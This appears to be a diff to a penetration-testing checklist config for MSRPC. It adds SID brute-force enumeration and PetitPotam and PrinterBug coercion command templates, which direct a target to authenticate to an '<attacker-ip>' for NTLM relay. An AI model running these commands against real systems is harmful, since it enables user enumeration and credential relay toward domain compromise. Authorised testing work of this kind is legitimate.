@@ -14,11 +14,23 @@ checks:
     label: "Listed RPC endpoints via rpcdump"
   - key: msrpc-iface-enum
     label: "Identified high-value interfaces (lsarpc, samr, winreg)"
+  - key: msrpc-lookupsid
+    label: "Brute-forced SIDs via lookupsid for user / group enumeration"
+  - key: msrpc-coerce
+    label: "Tested coercion paths (PrinterBug, PetitPotam) for relay"
 commands:
   - label: "impacket-rpcdump"
     template: "impacket-rpcdump @{IP} -port {PORT}"
   - label: "nmap msrpc scripts"
     template: "nmap -p{PORT} --script=msrpc-enum {IP}"
+  - label: "impacket-lookupsid (anonymous SID brute)"
+    template: "impacket-lookupsid EXAMPLE.LOCAL/anonymous@{IP} 20000"
+  - label: "rpcdump.py (impacket python entry-point)"
+    template: "rpcdump.py @{IP}"
+  - label: "PetitPotam coercion via lsarpc (relay listener required)"
+    template: "python3 PetitPotam.py <attacker-ip> {IP}"
+  - label: "PrinterBug coercion via spoolss (relay listener required)"
+    template: "python3 printerbug.py EXAMPLE.LOCAL/<user>:<pass>@{IP} <attacker-ip>"
 resources:
   - title: "135 - Pentesting MSRPC"
     url: "https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc"
